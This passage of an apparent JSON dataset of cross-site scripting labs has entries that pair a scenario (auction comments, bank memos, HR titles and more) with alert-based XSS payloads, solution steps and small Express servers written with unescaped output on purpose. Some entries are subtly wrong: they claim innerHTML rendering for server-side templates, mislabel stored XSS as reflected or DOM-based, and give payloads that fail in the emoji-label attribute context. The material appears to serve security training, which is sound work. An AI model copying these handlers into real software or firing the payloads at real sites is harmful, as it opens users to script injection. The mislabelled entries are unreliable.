      "Lab Description": "Multiplayer games allow custom lobby names. These are broadcasted live to all players using innerHTML. A crafted name leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create lobby: <script>alert(1)</script>",
        "Join lobby browser",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('lobbyXSS')</script>",
        "<img src=x onerror=alert('lobby')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet lobby = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-lobby', (req, res) => { lobby = req.body.name; res.redirect('/lobbies'); });\napp.get('/lobbies', (req, res) => { res.send(`<html><body><h3>${lobby}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via auction bid comment field",
      "Lab Description": "Bidders can leave a comment with their bids. These comments are shown using innerHTML. A malicious comment triggers stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit bid comment: <script>alert(1)</script>",
        "Seller opens bid history",
        "Script executes in comment section"
      ],
      "payloads": [
        "<script>alert('bidXSS')</script>",
        "<img src=x onerror=alert('bid')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/place-bid', (req, res) => { comment = req.body.comment; res.redirect('/bids'); });\napp.get('/bids', (req, res) => { res.send(`<html><body><p>${comment}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via shipping provider name in tracking system",
      "Lab Description": "Admins can add shipping provider names manually. These are rendered via innerHTML in the tracking status page. A malicious name leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add provider: <img src=x onerror=alert(1)>",
        "Open tracking info",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('shippingXSS')</script>",
        "<img src=x onerror=alert('track')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet provider = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-provider', (req, res) => { provider = req.body.name; res.redirect('/tracking'); });\napp.get('/tracking', (req, res) => { res.send(`<html><body><span>${provider}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via leaderboard player nickname",
      "Lab Description": "Players can set nicknames in leaderboards. If rendered via innerHTML, a crafted name leads to persistent XSS for viewers.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set nickname: <script>alert('XSS')</script>",
        "Visit leaderboard",
        "Script executes from nickname row"
      ],
      "payloads": [
        "<script>alert('nicknameXSS')</script>",
        "<img src=x onerror=alert('player')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet nickname = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-nickname', (req, res) => { nickname = req.body.name; res.redirect('/leaderboard'); });\napp.get('/leaderboard', (req, res) => { res.send(`<html><body><td>${nickname}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via code review comment in dev collaboration tool",
      "Lab Description": "Reviewers can comment on code snippets. Comments are rendered with innerHTML next to code. A crafted comment triggers XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit comment: <img src=x onerror=alert(1)>",
        "Open review page",
        "Script executes in comment block"
      ],
      "payloads": [
        "<script>alert('reviewXSS')</script>",
        "<img src=x onerror=alert('dev')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-comment', (req, res) => { comment = req.body.comment; res.redirect('/code'); });\napp.get('/code', (req, res) => { res.send(`<html><body><div>${comment}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via onboarding welcome message customization",
      "Lab Description": "Admins can customize the welcome message shown to new users during onboarding. If this message is rendered using innerHTML, a malicious input can result in stored XSS for every new user.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set welcome message to: <script>alert('XSS')</script>",
        "Register a new user and complete onboarding",
        "Script executes when message is displayed"
      ],
      "payloads": [
        "<script>alert('welcomeXSS')</script>",
        "<img src=x onerror=alert('onboard')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet message = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-welcome', (req, res) => { message = req.body.message; res.redirect('/'); });\napp.get('/onboarding', (req, res) => { res.send(`<html><body><h1>${message}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via refund reason field in e-commerce admin",
      "Lab Description": "When a refund is issued, admins can specify a reason which is displayed to the user. If the input is rendered without sanitization, reflected XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Issue refund with reason: <img src=x onerror=alert('XSS')>",
        "Customer opens refund history page",
        "Payload executes in refund reason display"
      ],
      "payloads": [
        "<script>alert('refundXSS')</script>",
        "<img src=x onerror=alert('refund')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reason = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/refund', (req, res) => { reason = req.body.reason; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><p>${reason}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via fitness challenge team name",
      "Lab Description": "Users can create fitness challenges and assign their own team names. These are rendered on challenge pages via innerHTML. A crafted name results in XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create team with name: <script>alert('XSS')</script>",
        "Visit challenge leaderboard",
        "Observe script execution from name field"
      ],
      "payloads": [
        "<script>alert('challengeXSS')</script>",
        "<img src=x onerror=alert('team')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet team = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/join-challenge', (req, res) => { team = req.body.name; res.redirect('/challenge'); });\napp.get('/challenge', (req, res) => { res.send(`<html><body><h3>${team}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CMS plugin configuration field",
      "Lab Description": "A CMS plugin allows user-defined descriptions to appear in its output. These fields are rendered with innerHTML. A malicious input can lead to stored XSS on the frontend.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Configure plugin with description: <script>alert('XSS')</script>",
        "View frontend widget using the plugin",
        "Script executes in plugin output"
      ],
      "payloads": [
        "<script>alert('pluginXSS')</script>",
        "<img src=x onerror=alert('cms')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/plugin-config', (req, res) => { desc = req.body.desc; res.redirect('/widget'); });\napp.get('/widget', (req, res) => { res.send(`<html><body><div>${desc}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via guestbook entry on public page",
      "Lab Description": "A public-facing guestbook allows anonymous users to leave messages. Entries are rendered using innerHTML without proper escaping, leading to stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit entry: <script>alert(1)</script>",
        "View guestbook page",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('guestbookXSS')</script>",
        "<img src=x onerror=alert('guest')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet entries = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/sign', (req, res) => { entries.push(req.body.msg); res.redirect('/guestbook'); });\napp.get('/guestbook', (req, res) => { const html = entries.map(e => `<li>${e}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via banking memo field in transaction list",
      "Lab Description": "Bank customers can attach memos to transfers. These are displayed in the transaction history using innerHTML. XSS is possible if input is not sanitized.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Transfer funds with memo: <script>alert('XSS')</script>",
        "View transaction history",
        "Script executes in memo field"
      ],
      "payloads": [
        "<script>alert('memoXSS')</script>",
        "<img src=x onerror=alert('bank')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet memo = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/transfer', (req, res) => { memo = req.body.memo; res.redirect('/history'); });\napp.get('/history', (req, res) => { res.send(`<html><body><td>${memo}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via email alias name in mailbox overview",
      "Lab Description": "Users can create email aliases with custom names. These are rendered in the UI using innerHTML. XSS occurs if input is not escaped.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create alias name: <script>alert('XSS')</script>",
        "View mailbox overview",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('aliasXSS')</script>",
        "<img src=x onerror=alert('alias')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-alias', (req, res) => { alias = req.body.name; res.redirect('/mailbox'); });\napp.get('/mailbox', (req, res) => { res.send(`<html><body><div>${alias}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via survey title in analytics dashboard",
      "Lab Description": "Survey creators can name their surveys. These titles appear in dashboards using innerHTML. A malicious title leads to stored XSS for admins.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create survey titled: <script>alert(1)</script>",
        "Open admin dashboard",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('surveyXSS')</script>",
        "<img src=x onerror=alert('survey')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-survey', (req, res) => { title = req.body.title; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via API gateway route description",
      "Lab Description": "Developers can add descriptions to API routes. These are rendered in the API gateway UI using innerHTML. If not sanitized, they are vulnerable to XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add route description: <script>alert('XSS')</script>",
        "Visit gateway interface",
        "Observe script execution from route listing"
      ],
      "payloads": [
        "<script>alert('routeXSS')</script>",
        "<img src=x onerror=alert('api')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-route', (req, res) => { desc = req.body.desc; res.redirect('/gateway'); });\napp.get('/gateway', (req, res) => { res.send(`<html><body><span>${desc}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via education platform lesson subtitle",
      "Lab Description": "Lesson creators can provide subtitles. These appear under videos using innerHTML. A malicious subtitle leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set subtitle to: <img src=x onerror=alert('XSS')>",
        "Open lesson viewer",
        "Script executes beneath video"
      ],
      "payloads": [
        "<script>alert('lessonXSS')</script>",
        "<img src=x onerror=alert('edu')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet subtitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-subtitle', (req, res) => { subtitle = req.body.subtitle; res.redirect('/lesson'); });\napp.get('/lesson', (req, res) => { res.send(`<html><body><p>${subtitle}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via job title in internal HR portal",
      "Lab Description": "Employees can submit custom job titles that appear in internal directories. These titles are rendered with innerHTML. A crafted title causes stored XSS when viewed by other employees.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set your job title to <img src=x onerror=alert('XSS')>",
        "Visit the company directory",
        "Script executes in job title display"
      ],
      "payloads": [
        "<script>alert('hrXSS')</script>",
        "<img src=x onerror=alert('job')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-title', (req, res) => { title = req.body.title; res.redirect('/directory'); });\napp.get('/directory', (req, res) => { res.send(`<html><body><span>${title}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via live polling answer text",
      "Lab Description": "Users can submit custom answers in live polls. These answers are displayed live using innerHTML. If not sanitized, this can lead to DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit poll answer: <script>alert('XSS')</script>",
        "Open live poll results",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('pollXSS')</script>",
        "<img src=x onerror=alert('vote')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet answer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/vote', (req, res) => { answer = req.body.answer; res.redirect('/results'); });\napp.get('/results', (req, res) => { res.send(`<html><body><div>${answer}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via feedback category label in support portal",
      "Lab Description": "Users can suggest custom feedback categories. These are displayed to all users using innerHTML. A malicious label causes persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit category: <img src=x onerror=alert(1)>",
        "Visit feedback page",
        "Observe XSS in category list"
      ],
      "payloads": [
        "<script>alert('feedbackXSS')</script>",
        "<img src=x onerror=alert('support')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet category = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { category = req.body.name; res.redirect('/feedback'); });\napp.get('/feedback', (req, res) => { res.send(`<html><body><li>${category}</li></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via weather widget city name",
      "Lab Description": "Users can add custom cities to their weather widgets. If the city name is injected unsanitized into innerHTML, XSS can occur in the dashboard.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add city: <img src=x onerror=alert('XSS')>",
        "Open dashboard widget",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('weatherXSS')</script>",
        "<img src=x onerror=alert('weather')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet city = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-city', (req, res) => { city = req.body.name; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><div>${city}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via mobile app push notification title",
      "Lab Description": "Admins can create push notifications. If the title is displayed using innerHTML in the web version, an XSS attack can be triggered.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set notification title to <img src=x onerror=alert(1)>",
        "Open web notifications page",
        "Payload executes immediately"
      ],
      "payloads": [
        "<script>alert('pushXSS')</script>",
        "<img src=x onerror=alert('notify')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet notif = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-notif', (req, res) => { notif = req.body.title; res.redirect('/notifications'); });\napp.get('/notifications', (req, res) => { res.send(`<html><body><h4>${notif}</h4></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via address book contact nickname",
      "Lab Description": "Users can set nicknames for contacts in their address book. These nicknames are rendered in the UI using innerHTML. XSS occurs if input is not sanitized.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add contact nickname: <script>alert(1)</script>",
        "Visit address book",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('contactXSS')</script>",
        "<img src=x onerror=alert('contact')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet nick = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-contact', (req, res) => { nick = req.body.nick; res.redirect('/contacts'); });\napp.get('/contacts', (req, res) => { res.send(`<html><body><span>${nick}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via conference attendee badge title",
      "Lab Description": "Attendees can enter a badge title. This title is rendered in the live event viewer using innerHTML. XSS is possible if not sanitized.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set badge title: <script>alert('XSS')</script>",
        "View attendee page",
        "Script executes from badge rendering"
      ],
      "payloads": [
        "<script>alert('badgeXSS')</script>",
        "<img src=x onerror=alert('attendee')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet badge = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/register', (req, res) => { badge = req.body.title; res.redirect('/attendees'); });\napp.get('/attendees', (req, res) => { res.send(`<html><body><h2>${badge}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom reaction label in messaging platform",
      "Lab Description": "Users can add custom labels to emoji reactions. Labels are rendered in tooltips via innerHTML. A crafted label can lead to DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add reaction label: <img src=x onerror=alert(1)>",
        "Hover over emoji in a chat",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('emojiLabelXSS')</script>",
        "<img src=x onerror=alert('emoji')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-reaction', (req, res) => { label = req.body.label; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><span title='${label}'>🔥</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via playlist description in music app",
      "Lab Description": "Users can add descriptions to their music playlists. These are rendered in the app UI using innerHTML. If not escaped, a malicious description can cause XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set description: <img src=x onerror=alert('XSS')>",
        "Open playlist page",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('musicXSS')</script>",
        "<img src=x onerror=alert('desc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-description', (req, res) => { desc = req.body.desc; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via virtual classroom whiteboard notes",
      "Lab Description": "Teachers can push quick notes to a virtual whiteboard. These notes are rendered in student browsers using innerHTML. A malicious note results in stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post note: <script>alert('XSS')</script>",
        "Students load whiteboard",
        "Payload executes in whiteboard area"
      ],
      "payloads": [
        "<script>alert('whiteboardXSS')</script>",
        "<img src=x onerror=alert('board')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/post-note', (req, res) => { note = req.body.note; res.redirect('/classroom'); });\napp.get('/classroom', (req, res) => { res.send(`<html><body><div>${note}</div></body></html>`); });\napp.listen(3000);"
    },
  
    {
      "Lab scenario": "XSS via live chat channel topic",
      "Lab Description": "Users can set topics for chat channels. These topics are rendered in the chat header using innerHTML. If unsanitized, a crafted topic results in persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set chat topic to <img src=x onerror=alert(1)>",
        "Join the channel",
        "Script executes in channel topic banner"
      ],
      "payloads": [
        "<script>alert('chatTopicXSS')</script>",
        "<img src=x onerror=alert('chat')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-topic', (req, res) => { topic = req.body.topic; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><h1>${topic}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via expense report note field",
      "Lab Description": "Employees can attach notes to expense reports. These notes are rendered in finance dashboards using innerHTML. A malicious note can cause stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a note with: <script>alert('XSS')</script>",
        "Open expense overview as finance user",
        "Payload executes in note preview"
      ],
      "payloads": [
        "<script>alert('expenseXSS')</script>",
        "<img src=x onerror=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { note = req.body.note; res.redirect('/expenses'); });\napp.get('/expenses', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via smart device custom label in IoT platform",
      "Lab Description": "Users can rename their devices. Labels are rendered via innerHTML in dashboards. A crafted name leads to XSS when the device is displayed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Name device: <script>alert('XSS')</script>",
        "Visit IoT dashboard",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('deviceLabelXSS')</script>",
        "<img src=x onerror=alert('iot')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/rename-device', (req, res) => { label = req.body.label; res.redirect('/devices'); });\napp.get('/devices', (req, res) => { res.send(`<html><body><h3>${label}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via e-learning quiz question field",
      "Lab Description": "Instructors can create custom quiz questions. If these are rendered with innerHTML, a malicious question text can result in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a quiz question: <script>alert(1)</script>",
        "Student opens the quiz",
        "Payload executes in question box"
      ],
      "payloads": [
        "<script>alert('quizXSS')</script>",
        "<img src=x onerror=alert('quiz')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet question = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-question', (req, res) => { question = req.body.text; res.redirect('/quiz'); });\napp.get('/quiz', (req, res) => { res.send(`<html><body><div>${question}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via booking confirmation message",
      "Lab Description": "Users receive confirmation messages for bookings. These are constructed with innerHTML using submitted notes. A crafted note can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit booking with message: <script>alert('XSS')</script>",
        "Receive confirmation page",
        "Script executes from note"
      ],
      "payloads": [
        "<script>alert('bookingXSS')</script>",
        "<img src=x onerror=alert('confirm')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet message = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/book', (req, res) => { message = req.body.note; res.redirect('/confirmation'); });\napp.get('/confirmation', (req, res) => { res.send(`<html><body><p>${message}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via project tag in team management tool",
      "Lab Description": "Project managers can add custom tags to projects. Tags are displayed using innerHTML. If unsanitized, a crafted tag causes XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add tag: <img src=x onerror=alert('XSS')>",
        "Open project dashboard",
        "Observe XSS in tag display"
      ],
      "payloads": [
        "<script>alert('projectTagXSS')</script>",
        "<img src=x onerror=alert('tag')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tag = req.body.tag; res.redirect('/projects'); });\napp.get('/projects', (req, res) => { res.send(`<html><body><div>${tag}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via digital signature name in approval system",
      "Lab Description": "Users sign documents with a typed signature. The name is rendered using innerHTML in the final preview. A crafted name triggers XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Sign document with: <script>alert(1)</script>",
        "Download or preview signed file",
        "Payload executes in document preview"
      ],
      "payloads": [
        "<script>alert('signatureXSS')</script>",
        "<img src=x onerror=alert('sign')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet sign = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/sign', (req, res) => { sign = req.body.name; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><footer>${sign}</footer></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via bug tracker issue label",
      "Lab Description": "Developers can label issues with custom text. If rendered via innerHTML, a crafted label causes stored XSS in the issue list.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create label: <img src=x onerror=alert('XSS')>",
        "View issue list",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('issueLabelXSS')</script>",
        "<img src=x onerror=alert('bug')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-label', (req, res) => { label = req.body.label; res.redirect('/issues'); });\napp.get('/issues', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via vehicle nickname in fleet management",
      "Lab Description": "Admins can assign nicknames to vehicles. These are rendered in dashboards via innerHTML. If unsanitized, XSS occurs.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set nickname: <img src=x onerror=alert(1)>",
        "Visit fleet page",
        "Observe XSS on render"
      ],
      "payloads": [
        "<script>alert('vehicleXSS')</script>",
        "<img src=x onerror=alert('fleet')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet name = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-nickname', (req, res) => { name = req.body.name; res.redirect('/fleet'); });\napp.get('/fleet', (req, res) => { res.send(`<html><body><td>${name}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via featured review title on product page",
      "Lab Description": "Top reviews are highlighted with a custom title. If rendered unsanitized using innerHTML, XSS occurs on product detail view.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit review title: <script>alert('XSS')</script>",
        "Product page loads with featured review",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('reviewXSS')</script>",
        "<img src=x onerror=alert('review')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => { title = req.body.title; res.redirect('/product'); });\napp.get('/product', (req, res) => { res.send(`<html><body><h3>${title}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via invoice note in billing platform",
      "Lab Description": "Clients can attach notes to invoices. These notes are displayed in the client portal using innerHTML. If unsanitized, the note can cause stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit invoice with note: <img src=x onerror=alert('XSS')>",
        "Open invoice in client portal",
        "Payload executes in note section"
      ],
      "payloads": [
        "<script>alert('invoiceXSS')</script>",
        "<img src=x onerror=alert('bill')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-invoice', (req, res) => { note = req.body.note; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via newsletter campaign name",
      "Lab Description": "Marketing teams can name newsletter campaigns. Campaign names appear in the dashboard via innerHTML. Malicious names trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create campaign named: <script>alert('XSS')</script>",
        "Visit newsletter dashboard",
        "Observe script execution in campaign list"
      ],
      "payloads": [
        "<script>alert('newsletterXSS')</script>",
        "<img src=x onerror=alert('mail')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet campaign = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/new-campaign', (req, res) => { campaign = req.body.name; res.redirect('/campaigns'); });\napp.get('/campaigns', (req, res) => { res.send(`<html><body><div>${campaign}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via virtual event room name",
      "Lab Description": "Event organizers can name virtual rooms. These names are reflected into the frontend using innerHTML. A malicious name results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create room with name: <img src=x onerror=alert('XSS')>",
        "Join virtual event",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('roomXSS')</script>",
        "<img src=x onerror=alert('virtual')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet room = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-room', (req, res) => { room = req.body.name; res.redirect('/event'); });\napp.get('/event', (req, res) => { res.send(`<html><body><h2>${room}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via book title in online library system",
      "Lab Description": "Admins can add books with custom titles. These are rendered via innerHTML on the catalog page. Unsanitized input causes XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add book: <img src=x onerror=alert(1)>",
